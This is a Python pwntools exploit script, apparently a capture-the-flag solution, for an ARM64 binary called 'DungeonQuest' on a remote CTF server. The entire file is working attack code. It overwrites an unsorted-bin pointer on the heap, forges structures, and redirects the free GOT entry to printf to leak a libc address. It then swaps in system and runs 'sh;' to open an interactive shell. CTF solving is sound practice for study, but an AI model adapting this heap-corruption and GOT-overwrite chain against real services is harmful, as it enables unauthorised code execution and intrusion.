from pwn import *
context.log_level = 'debug'
#p = process("./qemu-aarch64 -g 1234 -L /home/insu/projects/xxx/venv/bin/fuzzer-libs/arm64 ./DungeonQuest".split())
#p = process("qemu-aarch64 -g 1234 -L /home/insu/projects/xxx/venv/bin/fuzzer-libs/arm64 ./DungeonQuest".split())
#p = process("qemu-aarch64 -L /home/insu/projects/xxx/venv/bin/fuzzer-libs/arm64 ./DungeonQuest".split())
p = remote("dungeonquest.eatpwnnosleep.com", 31337)

def add_macro(name, word):
    p.recvuntil("> ")
    p.send("2\n")
    p.recvuntil("> ")

    p.send("1\n")
    p.recvuntil("> ")

    p.send("%s\n" % name)
    p.readline()

    p.send("%s\n" % word)

    p.recvuntil("> ")
    p.send("3\n")

def delete_macro(name):
    p.recvuntil("> ")
    p.send("2\n")
    p.recvuntil("> ")

    p.send("2\n")
    p.recvuntil("> ")

    p.send("%s\n" % name)
    r = p.readline()

    p.recvuntil("> ")
    p.send("3\n")
    return r

def delete_macro2(name):
    p.recvuntil("> ")
    p.send("2\n")
    p.recvuntil("> ")

    p.send("2\n")
    p.recvuntil("> ")

    p.send("%s\n" % name)

add_macro("fireball", "1")
add_macro("iceball", "1")
delete_macro("fireball")

# overwrite the unsorted bin bk
add_macro("fireball", p64(0) + p64(0x4120D0-16))
add_macro("meteo", "1")

FREE_GOT = 0x412070
LIBC_START_MAIN_GOT = 0x412028

START = 0x4120d8
BUF = START + 0x300
fake_struct = p64(START+8 * 5) + p64(0) + p64(0x100) + p64(LIBC_START_MAIN_GOT) + p64(0x0)
fake_struct2 = p64(0) + p64(0) + p64(0x100) + p64(FREE_GOT) + p64(0x0)
add_macro("fireball", "A"*16 + p64(0x4120d8) + fake_struct + fake_struct2)


PRINTF_PLT = 0x4009C0
add_macro("iceball", p64(PRINTF_PLT))

r = delete_macro("fireball")
libc_base = u64(r.split("macro")[0].ljust(8, "\x00")) - 0x01F7C0
print("LIBC_BASE: %08x" % libc_base)

system = libc_base + 0x3D818
add_macro("fireball", "sh;\x00")
add_macro("iceball", p64(system))
delete_macro2("fireball")

p.interactive()
